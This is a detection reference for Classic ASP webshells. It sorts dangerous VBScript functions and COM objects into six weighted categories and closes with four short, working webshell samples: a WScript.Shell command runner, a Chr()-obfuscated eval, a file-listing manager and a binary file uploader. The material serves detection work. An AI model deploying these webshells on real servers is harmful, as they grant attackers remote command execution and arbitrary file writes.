# ASP Dangerous Patterns — 6 Behavioral Categories

Adapted from BFAD's PHP framework for Classic ASP (VBScript-based) Webshell detection.

ASP Webshells target Windows + IIS environments. The attack chain remains: **Input → Transform → Execute**, but uses COM objects (`Server.CreateObject`) as the primary execution mechanism.

## Category 1: Code Execution (Weight: 0.2081)

ASP's code execution equivalents — dynamic script execution and COM object invocation.

| Pattern / Function | Signature | Notes |
|-------------------|-----------|-------|
| `Eval()` | `Eval(expression)` | Executes VBScript expression. ASP equivalent of PHP's `eval()`. |
| `Execute()` | `Execute(statement)` | Executes VBScript statement(s). More powerful than Eval — can execute multiple lines. |
| `ExecuteGlobal()` | `ExecuteGlobal(statement)` | Executes in global scope. Allows function/variable definition. |
| `Server.Execute()` | `Server.Execute(path)` | Executes another ASP page. Can include attacker-uploaded scripts. |
| `Server.Transfer()` | `Server.Transfer(path)` | Transfers execution to another page. |

## Category 2: Program Execution (Weight: 0.2068)

COM objects that invoke the Windows shell or system commands — the ASP equivalent of `exec()` / `system()`.

| Pattern | Signature | Notes |
|---------|-----------|-------|
| `WScript.Shell` | `CreateObject("WScript.Shell").Run(cmd)` | **Most common ASP Webshell primitive**. Can run any Windows command. |
| `WScript.Shell.Exec` | `CreateObject("WScript.Shell").Exec(cmd)` | Runs command and provides access to StdIn/StdOut/StdErr. |
| `Shell.Application` | `CreateObject("Shell.Application").ShellExecute(cmd)` | Alternative shell execution. Can launch GUI programs. |
| `Shell.Application.Open` | `CreateObject("Shell.Application").Open(path)` | Opens file/URL. |
| `WScript.Network` | `CreateObject("WScript.Network")` | Network-related operations (user name, computer name, domain). |
| `MSXML2.ServerXMLHTTP` | `CreateObject("MSXML2.ServerXMLHTTP").open(method, url, async)` | Can fetch remote scripts for execution. |

## Category 3: Obfuscation & Transform (Weight: 0.1702)

| Pattern | Signature | Notes |
|---------|-----------|-------|
| `Chr()` | `Chr(ascii_code)` | Character from ASCII. Most common ASP obfuscation: `Chr(101)&Chr(118)&Chr(97)&Chr(108)` → `eval`. |
| `ChrW()` | `ChrW(unicode_code)` | Unicode variant. |
| `Asc()` | `Asc(character)` | Reverse of Chr — ASCII value of character. Used in self-decoding routines. |
| `Mid()` | `Mid(string, start, length)` | Extracts substring. Used to parse encoded payloads. |
| `StrReverse()` | `StrReverse(string)` | String reversal — hide function names. |
| `Replace()` | `Replace(string, find, replace_with)` | String replacement — decode split payloads. |
| `Split()` | `Split(string, delimiter)` | Split string to array. Used in compound encoding. |
| `Join()` | `Join(array, delimiter)` | Join array to string. Reassemble split payloads. |
| `Hex()` | `Hex(number)` | Decimal to hex. Part of hex encoding chains. |
| `CLng()` / `CInt()` | `CLng("&H" & hex_string)` | Hex string to number. Decode hex-encoded ASCII values. |
| Base64 Decode | `CreateObject("MSXML2.DOMDocument").loadXML()...` | No native base64 in VBScript — typically uses MSXML or custom implementation. |
| `ADODB.Stream` | `CreateObject("ADODB.Stream")` | Binary stream for encoding/decoding. Used for base64 and binary operations. |

## Category 4: Input Channels

| Pattern | Example | Notes |
|---------|---------|-------|
| `Request.Form()` | `Request.Form("cmd")` | POST parameter — most common Webshell input. |
| `Request.QueryString()` | `Request.QueryString("cmd")` | GET parameter. |
| `Request()` | `Request("cmd")` | Generic — searches Form, QueryString, Cookies, ServerVariables in order. |
| `Request.BinaryRead()` | `Request.BinaryRead(byteCount)` | Raw request body. For binary/encoded payloads. |
| `Request.ServerVariables()` | `Request.ServerVariables("HTTP_X_CMD")` | HTTP header-based input — very stealthy. |
| `Request.Cookies()` | `Request.Cookies("data")` | Cookie-based input channel. |
| `Request.TotalBytes` | Total post size | Used with BinaryRead for chunked uploads. |

## Category 5: File Operations

File operations are more central to ASP Webshells than PHP ones (since VBScript has fewer execution primitives, attackers often write files first).

| Pattern | Signature | Notes |
|---------|-----------|-------|
| `Scripting.FileSystemObject` | `CreateObject("Scripting.FileSystemObject")` | Universal file system access. **Core of most ASP Webshells**. |
| `FSO.CreateTextFile()` | Write text to file | Writing Webshell content to disk. |
| `FSO.OpenTextFile()` | Read text from file | Reading reconnaissance data. |
| `FSO.CopyFile()` | Copy file | Move malware. |
| `FSO.DeleteFile()` | Delete file | Anti-forensics. |
| `FSO.FileExists()` | Check if file exists | Recon. |
| `FSO.GetFile()` | Get File object | Get file properties (size, date, etc.). |
| `FSO.GetFolder()` | Get Folder object | Directory listing / recon. |
| `FSO.DriveExists()` | Check drive | Recon — check mounted drives. |
| `ADODB.Stream` | Binary file read/write | Binary file manipulation. Bypasses text-based detection. |

## Category 6: Information Gathering (Weight: 0.1861)

| Pattern | Notes |
|---------|-------|
| `Request.ServerVariables("SERVER_NAME")` | Server hostname. |
| `Request.ServerVariables("SERVER_SOFTWARE")` | IIS version. |
| `Request.ServerVariables("APPL_PHYSICAL_PATH")` | Web root — critical recon. |
| `Request.ServerVariables("PATH_TRANSLATED")` | File path mapping. |
| `Server.MapPath()` | Virtual to physical path conversion. |
| `Session.SessionID` | Session identifier. |
| `Application.Contents` | Application scope inspection. |
| `CreateObject("WScript.Shell").Environment` | Environment variables. |
| `CreateObject("WScript.Network").ComputerName` | Host name. |
| `CreateObject("WScript.Network").UserName` | Current user identity. |

## Common ASP Webshell Patterns

### Pattern 1: Classic WScript.Shell One-Liner
```asp
<%
    cmd = Request("cmd")
    Set shell = CreateObject("WScript.Shell")
    Set exec = shell.Exec("cmd /c " & cmd)
    Response.Write(exec.StdOut.ReadAll())
%>
```
Attack chain: `Request()` → `CreateObject("WScript.Shell")` → `.Exec()`

### Pattern 2: Chr() Obfuscated (No Plaintext Keywords)
```asp
<%
    e = Chr(101)&Chr(118)&Chr(97)&Chr(108)
    Execute(e & "(" & Request("cmd") & ")")
%>
```
Builds "eval" from Chr() codes → executes dynamic expression.

### Pattern 3: File Manager Webshell
```asp
<%
    Set FSO = CreateObject("Scripting.FileSystemObject")
    path = Request("path")
    If Request("action") = "list" Then
        Set folder = FSO.GetFolder(path)
        For Each file In folder.Files
            Response.Write(file.Name & "<br>")
        Next
    End If
%>
```
Category: [Input: Request] [File Operation: FileSystemObject.GetFolder]

### Pattern 4: ADODB.Stream Binary Upload
```asp
<%
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1  ' Binary
    stream.Open()
    stream.Write(Request.BinaryRead(Request.TotalBytes))
    stream.SaveToFile(Server.MapPath(Request("filename")), 2)
%>
```
Category: [Input: Request.BinaryRead] [File Operation: ADODB.Stream.SaveToFile]
